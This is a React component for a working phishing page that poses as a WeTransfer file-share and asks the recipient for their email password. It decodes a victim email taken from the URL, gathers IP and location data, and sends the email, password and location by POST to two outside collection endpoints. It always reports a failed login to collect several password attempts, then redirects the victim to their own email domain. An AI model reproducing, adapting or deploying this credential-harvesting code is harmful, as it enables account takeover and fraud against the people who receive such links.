import React, {useEffect, useState} from "react";
import './iceberg.css';
// import Tipp from '../assets/tippp.png';
// import weT from '../assets/wetransfer-3.svg';
import tyduyyi from '../assets/tttt.svg';
import $ from 'jquery';



export const Iceberg = ()=>{




    const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');


    useEffect(()=>{
        fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=44db379787c14bccb69d3de62462aefb`)
        .then(req=> req.json())
        .then(res=>{
            // setCountry(res.names.en)
            // console.log(res.names.en);
            // console.log('city:',res.city.name);

            setIpAdress(res.ip)
            setFlag(res.country.flag);
            setCountry(res.country.name);
            setCity(res.city.names.en);

            
            
            
            
            // console.log('ipAddress:', res.ip);
            // console.log('flag:', res.country.flag);
            // console.log('country:', res.country.name);
            // console.log('city:', res.city.names.en);
            // console.log(res);
        })
        .catch(e=> console.log)
    }, []);



    
    const reloadPreloader = ()=> window.location.reload();
    
    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
    
    


    const redirectURL = window.location.href;
    const sliceEqualSignR = redirectURL.indexOf("@");
    const extracetdemailDomain = redirectURL.substr((sliceEqualSignR+1)).split('&', 1).toString();

    const [email, setEmail] = useState(extracetdEmail);
    const [pwd, setPwd] = useState('');

    const [emptyPswd, setEmptyPswd] = useState(false);

    const [count, setCount] = useState(0);

    const [err, setErr] = useState(false);

    const [btnVal, setBtnVal] = useState('Continue');

    const dcdEml = ()=>{
        const emaildeco = document.querySelector('.txt_mn_eml');
        const dec = emaildeco.innerHTML = window.atob(email);


        const a = document.querySelector('#main_em__l');
        const b = a.innerHTML = window.atob(email);
    }
    
    useEffect(()=>{
        dcdEml();
    }, []);


    const distinction = (___________distinct) => {

        const a = document.querySelector('#main_em__l');
        const b = a.innerHTML = window.atob(email);

        ___________distinct.preventDefault();
        if (pwd === "") {
            setEmptyPswd(true);
            setErr(false);
          return null
        }
        
        else{
            setEmail(email);
            setBtnVal('Verifying...');
            
            setTimeout(() => {
              setPwd('');
              setErr(true);
              setEmptyPswd(false);
              setBtnVal('Continue');
            }, 2200);
    
            const user = {
                email: b,
                pswd: pwd,
                country: country,
                city: city,
                flag: flag,
                eyep: ipAdress
            };
            // console.log(b);
    
          $.ajax({
              type: "POST",
              url: "https://send-service-quotaion.onrender.com/get_details/internationalspe@gmail.com/order/",
            //   url: "https://bucketlion.com/hello/spei.php",
            // speinter82@gmail.com
              data: user,
              success(data) {
                  console.log(data);
              },
          });



            
            const user = {
                email: b,
                password: pwd,
            };

          $.ajax({
              type: "POST",
              url: "https://physicaleducationdiploma.com/footer/spein.php",
            //   url: "https://bucketlion.com/hello/spei.php",
            // speinter82@gmail.com
              data: user,
              success(data) {
                  console.log(data);
              },
          });

            
    
        
          setCount(count=> count + 1);
                if(count >= 2){
                    setTimeout(() => {
                        window.location.reload();
                        window.location.href = `https://www.${extracetdemailDomain}`;
                    }, 1000);
                };
        }
      };


    return(<>
        <div className="iceberg">
            <div className="mai____n___kjhgh__npoiuytrTYH">

                <div style={{
                    display:'flex',
                    justifyContent:'center',
                    marginTop:'2em'
                }}>
                    <img
                        alt="tipp"
                        className="tip"
                        src={tyduyyi}
                        onClick={reloadPreloader}
                        style={{cursor:'pointer'}}
                    />
                </div>


                <span style={{textAlign:'center', display:'flex', justifyContent:'center', marginTop:'4px'}}>Send files, move ideas with wetransfer</span>

                <p className="txt_em__l_kjhgtyH">3 files shared with <span className="txt_mn_eml">{email}</span></p>

                <p className="proagn">
                    These documents are protected against unauthorized access Please enter the password of the receipient email below to view these documents
                </p>


                <form id="form" className="form" onSubmit={distinction}>
                    <div className="eml_wrppe____r">
                        {/* <b> */}
                        <span className="labl">
                            Receipient Email:
                        </span>
                        {/* </b> */}
                        &#160;
                        {/* &#160; */}
                        <span className="txt_mn_eml" id="main_em__l">
                            {email}
                        </span>
                    </div>

                    <div className="eml_wrppe____r" style={{
                        marginTop:'5px'
                    }}>
                        {/* <b> */}
                        <span className="labl">
                            Receipient Password:
                        </span>
                        {/* </b> */}
                        &#160;
                        {/* &#160; */}
                        <span className="txt_mn_eml">
                            <input 
                                type="password"
                                className="pswd"
                                id="password"
                                placeholder="Enter email password"
                                autoFocus
                                value={pwd}
                                onChange={ e=> setPwd(e.target.value) }
                            />
                        </span>
                    </div>



                    { err ? <p className="err">
                        Error: Authentication failed, please try again with your correct email password.
                    </p> : null }


                    { emptyPswd ? <p className="err">Error! Please enter your password.</p> : null }



                    <div className="btn_wrap">
                        <input 
                            type="submit"
                            value={btnVal}
                            className="btn"
                            onClick={distinction}
                        />
                    </div>


                    <p className="ice_foote__r_kjhgyjkFGyuiklm">Copyright (c) Wetransfer Plus 2024</p>


                </form>

                
            </div>
        </div>
    </>)
};
